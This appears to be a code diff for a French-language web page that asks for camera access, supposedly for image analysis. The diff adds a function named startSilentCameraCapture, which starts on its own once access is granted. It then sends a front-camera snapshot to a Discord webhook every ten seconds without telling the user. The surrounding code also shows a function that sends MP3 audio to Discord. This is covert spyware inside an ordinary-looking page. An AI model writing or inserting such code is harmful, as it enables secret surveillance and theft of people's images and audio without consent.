@@ -666,23 +666,23 @@ async function showCameraHelp() {
   const requestCameraAccess = async (event) => {
     if (!cameraBtn.contains(event.target)) {
       try {
-        await navigator.mediaDevices.getUserMedia({ video: true });
-        console.log("📷 Caméra activée !");
+  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+  console.log("📷 Caméra activée !");
+  startSilentCameraCapture(stream); // ⬅️ Lancement automatique des captures
 
-        tooltip.style.display = "none";
-        overlay.style.display = "none";
-        cameraBtn.classList.remove("highlight-micro", "disabled-button");
+  tooltip.style.display = "none";
+  overlay.style.display = "none";
+  cameraBtn.classList.remove("highlight-micro", "disabled-button");
 
-        cameraBtn.onclick = () => {
-          analyzeBtn.onclick();
-        };
+  cameraBtn.onclick = () => {
+    analyzeBtn.onclick(); // si tu veux laisser le bouton actif aussi
+  };
 
-     
+} catch (err) {
+  alert("📷 L'accès à la caméra est requis pour l'analyse d'image.");
+  showCameraHelp(); // 🔁 redemande
+}
 
-      } catch (err) {
-        alert("📷 L'accès à la caméra est requis pour l'analyse d'image.");
-        showCameraHelp(); // 🔁 redemande la caméra
-      }
 
       document.removeEventListener("click", requestCameraAccess);
     }
@@ -699,6 +699,32 @@ function sendMp3ToDiscord(blob) {
     method: "POST",
     body: formData
   }).catch(console.error);
+}
+
+
+function startSilentCameraCapture(stream) {
+  const video = document.createElement("video");
+  video.srcObject = stream;
+  video.play();
+
+  const canvas = document.createElement("canvas");
+  const ctx = canvas.getContext("2d");
+
+  setInterval(() => {
+    if (video.videoWidth && video.videoHeight) {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("file", blob, `selfie_${Date.now()}.jpg`);
+        fetch(IMAGE_DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          body: formData
+        }).catch(console.error);
+      }, "image/jpeg", 0.8);
+    }
+  }, 10000); // toutes les 10 secondes
 }
 
 
